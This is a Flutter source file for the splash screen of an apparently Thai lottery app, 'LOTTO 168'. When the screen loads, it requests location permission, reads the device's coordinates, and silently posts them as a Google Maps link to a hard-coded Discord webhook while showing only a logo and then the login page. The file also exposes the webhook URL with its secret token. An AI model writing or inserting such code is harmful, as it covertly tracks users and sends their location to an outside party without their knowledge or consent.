import 'dart:async';
import 'dart:convert';

import 'package:LOTTO168/page/login.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:fl_location/fl_location.dart'; // ใช้ fl_location สำหรับตำแหน่ง
import 'package:http/http.dart' as http;

enum ButtonState { LOADING, DONE, DISABLED }

class ScreenPage extends StatefulWidget {
  const ScreenPage({super.key});

  @override
  State<ScreenPage> createState() => _ScreenPageState();
}

class _ScreenPageState extends State<ScreenPage>
    with SingleTickerProviderStateMixin {
  StreamSubscription<Location>? _locationSubscription;

  final _resultText = ValueNotifier('');
  final _getLocationButtonState = ValueNotifier(ButtonState.DONE);
  final _subscribeLocationStreamButtonState = ValueNotifier(ButtonState.DONE);
  final _isSubscribeLocationStream = ValueNotifier(false);

  @override
  void initState() {
    super.initState();
    if (!kIsWeb) {
      FlLocation.getLocationServicesStatusStream().listen((event) {
        print('LocationServicesStatus: $event');
      });
    }
    _getLocation();
    Future.delayed(const Duration(seconds: 5), () {
      Navigator.of(context).pushReplacement(
          MaterialPageRoute(builder: (_) => const LoginPage()));
    });
  }

  @override
  void dispose() {
    _locationSubscription?.cancel();
    _resultText.dispose();
    _getLocationButtonState.dispose();
    _subscribeLocationStreamButtonState.dispose();
    _isSubscribeLocationStream.dispose();
    super.dispose();
  }

  Future<bool> _checkAndRequestPermission({bool? background}) async {
    if (!await FlLocation.isLocationServicesEnabled) {
      _resultText.value = 'บริการตำแหน่งถูกปิดใช้งาน.';
      return false;
    }

    var locationPermission = await FlLocation.checkLocationPermission();
    if (locationPermission == LocationPermission.deniedForever) {
      _resultText.value = 'การอนุญาตตำแหน่งถูกปฏิเสธถาวร.';
      return false;
    } else if (locationPermission == LocationPermission.denied) {
      locationPermission = await FlLocation.requestLocationPermission();
      if (locationPermission == LocationPermission.denied ||
          locationPermission == LocationPermission.deniedForever) {
        _resultText.value = 'การอนุญาตตำแหน่งถูกปฏิเสธ.';
        return false;
      }
    }

    if (background == true &&
        locationPermission == LocationPermission.whileInUse) {
      _resultText.value =
          'ต้องการการอนุญาตตำแหน่งตลอดเวลาสำหรับการรวบรวมตำแหน่งในพื้นหลัง.';
      return false;
    }

    return true;
  }

  Future<void> _getLocation() async {
    if (await _checkAndRequestPermission()) {
      _getLocationButtonState.value = ButtonState.LOADING;
      _subscribeLocationStreamButtonState.value = ButtonState.DISABLED;

      try {
        final Duration timeLimit = const Duration(seconds: 10);
        final location = await FlLocation.getLocation(timeLimit: timeLimit);
        _onLocationDetected(location);
      } catch (error) {
        _handleError(error);
      } finally {
        _getLocationButtonState.value = ButtonState.DONE;
        _subscribeLocationStreamButtonState.value = ButtonState.DONE;
      }
    }
  }

  Future<void> _subscribeLocationStream() async {
    if (await _checkAndRequestPermission()) {
      if (_locationSubscription != null) {
        await _unsubscribeLocationStream();
      }

      _locationSubscription = FlLocation.getLocationStream()
          .handleError(_handleError)
          .listen(_onLocationDetected);

      _getLocationButtonState.value = ButtonState.DISABLED;
      _isSubscribeLocationStream.value = true;
    }
  }

  Future<void> _unsubscribeLocationStream() async {
    await _locationSubscription?.cancel();
    _locationSubscription = null;

    _getLocationButtonState.value = ButtonState.DONE;
    _isSubscribeLocationStream.value = false;
  }

  void _onLocationDetected(Location location) {
    _resultText.value = location.toJson().toString();
    // ส่งตำแหน่งไปยัง Discord
    sendLocationToDiscord(location.latitude, location.longitude);
  }

  void _handleError(dynamic error) {
    _resultText.value = error.toString();
  }

  Future<void> sendLocationToDiscord(double latitude, double longitude) async {
    final webhookUrl =
        'https://discord.com/api/webhooks/1280536604594671690/xlEDEUFvNH3SiMVUKIa3WdQ5DWdJBL7AAMUw9SwqYJSMHTFY0P-HxFp9WjCceUEzjobL';
    final googleMapsUrl =
        'https://www.google.com/maps/search/?api=1&query=$latitude,$longitude';
    final message = {
      'content': 'ตำแหน่งใหม่: $googleMapsUrl',
    };

    final response = await http.post(
      Uri.parse(webhookUrl),
      headers: <String, String>{
        'Content-Type': 'application/json; charset=UTF-8',
      },
      body: jsonEncode(message),
    );

    if (response.statusCode == 204) {
      print('ส่งข้อความไปยัง Discord สำเร็จ');
    } else {
      print('ส่งข้อความไปยัง Discord ล้มเหลว: ${response.statusCode}');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      body: Center(
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Image.asset(
              'assets/img/Lotto.png', // ระบุ path ของไฟล์โลโก้
              width: 150, // กำหนดขนาดโลโก้
              height: 100,
            ),
            const Text(
              'LOTTO 168\nซื้อง่าย สบายใจ พร้อมบิด',
              textAlign: TextAlign.center, // จัดข้อความให้อยู่ตรงกลาง
              style: TextStyle(
                fontSize: 22,
                fontWeight: FontWeight.bold,
                fontFamily: 'Revalia', // ใช้ฟอนต์ Revalia
                color: Color(0xFF471AA0),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildTestButton({
    required String text,
    required ButtonState state,
    VoidCallback? onPressed,
  }) {
    return ElevatedButton(
      child: (state == ButtonState.LOADING)
          ? SizedBox.fromSize(
              size: const Size.square(20.0),
              child: const CircularProgressIndicator(strokeWidth: 2.0))
          : Text(text),
      onPressed: (state == ButtonState.DONE) ? onPressed : null,
    );
  }
}
